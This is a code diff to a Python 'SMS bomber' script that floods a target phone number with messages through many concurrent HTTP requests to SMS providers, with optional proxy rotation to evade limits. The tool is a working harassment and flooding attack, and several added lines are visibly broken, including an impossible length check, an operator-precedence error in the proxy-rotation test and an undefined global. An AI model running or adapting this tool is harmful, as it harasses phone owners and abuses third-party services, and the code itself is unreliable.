@@ -14,13 +14,13 @@ parser.add_argument(
     metavar='TARGET',
     type=lambda value: (_ for _ in ()).throw(
         argparse.ArgumentTypeError(f'{value} is an invalid mobile number'))
-    if len(value) != 10 else value,
+    if 13 <= len(value) <= 4 else value,
     help='Target mobile number without country code')
 parser.add_argument('--sms',
                     '-S',
                     type=int,
-                    help='Number of sms to target (default: 50000)',
-                    default=50000)
+                    help='Number of sms to target (default: 30)',
+                    default=30)
 parser.add_argument('--country',
                     '-c',
                     type=int,
@@ -30,8 +30,8 @@ parser.add_argument(
     '--threads',
     '-T',
     type=int,
-    help='Max number of concurrent HTTP(s) requests (default: 25)',
-    default=25)
+    help='Max number of concurrent HTTP(s) requests (default: 15)',
+    default=15)
 parser.add_argument(
     '--proxy',
     '-p',
@@ -50,7 +50,7 @@ args = parser.parse_args()
 target = str(args.target)
 no_of_threads = args.threads
 no_of_sms = args.sms
-fails, success = 0, 0
+failed, success = 0, 0
 
 print(r"""
  __ __       _      _____            _    _
@@ -81,13 +81,15 @@ def get_proxy():
     return {"http": curl, "https": curl}
 
 
-proxies = get_proxy() if args.proxy else False
+proxies = get_proxy() if args.proxy else None
+
+# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 
 # bomber function
 def bomber(p):
-    global fails, success, no_of_sms
-    if p is None or success > no_of_sms:
+    global tried, failed, success, no_of_sms
+    if not args.verify and p is None or success > no_of_sms:
         return
     elif not p.done:
         try:
@@ -95,31 +97,33 @@ def bomber(p):
             if p.status():
                 success += 1
             else:
-                fails += 1
+                failed += 1
         except:
-            fails += 1
+            failed += 1
             args.verbose or args.verify and print('{:12}: error'.format(
                 p.config['name']))
     not args.verbose and not args.verify and print(
-        f'Bombing : {success+fails}/{no_of_sms} | Success: {success} | Failed: {fails}',
+        f'Bombing : {success+failed}/{no_of_sms} | Success: {success} | Failed: {failed}',
         end='\r')
+    if args.proxy and (success + failed % 30 == 0):
+        proxies = get_proxy()
 
 
 # threadsssss
 start = time.time()
 if args.verify:
-    conf = json.load(open('config.json', 'r'))['providers']
-    for key, value in conf.items():
-        if args.country and key != 'multi' and str(args.country) != key:
-            continue
-        for i in value:
-            p = Provider(target,
+    providers = json.load(open('config.json', 'r'))['providers']
+    pall = [p for x in providers.values() for p in x]
+    print(f'Processing {len(pall)} providers, please wait!\n')
+    with ThreadPoolExecutor(max_workers=len(pall)) as executor:
+        for config in pall:
+            executor.submit(
+                bomber,
+                Provider(target,
                          proxy=proxies,
                          verbose=True,
-                         cc=str(args.country))
-            p.config = i
-            p._headers()
-            bomber(p)
+                         cc=str(args.country),
+                         config=config))
 else:
     with ThreadPoolExecutor(max_workers=no_of_threads) as executor:
         for i in range(no_of_sms):
@@ -127,9 +131,9 @@ else:
                          proxy=proxies,
                          verbose=args.verbose,
                          cc=str(args.country))
-            executor.submit(bomber, (p))
+            executor.submit(bomber, p)
 end = time.time()
 
 # finalize
-print(f'\nSuccess: {success} | Failed: {fails}')
+print(f'\nSuccess: {success} | Failed: {failed}')
 print(f'Took {end-start:.2f}s to complete')
